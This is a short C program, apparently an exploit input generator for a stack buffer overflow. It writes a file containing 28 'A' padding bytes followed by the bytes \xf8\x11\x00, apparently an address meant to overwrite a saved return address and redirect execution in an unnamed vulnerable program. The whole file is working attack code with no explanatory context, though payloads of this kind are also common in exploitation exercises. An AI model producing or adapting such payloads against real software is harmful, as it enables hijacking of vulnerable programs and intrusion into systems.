#include <stdio.h>
int main (int argc ,char **argv)
{
	char s[] ="AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf8\x11\x00";
	FILE *f = fopen(argv[1],"wb");
	fwrite(s,1,sizeof(s),f);
	fclose(f);
	return 0;
}
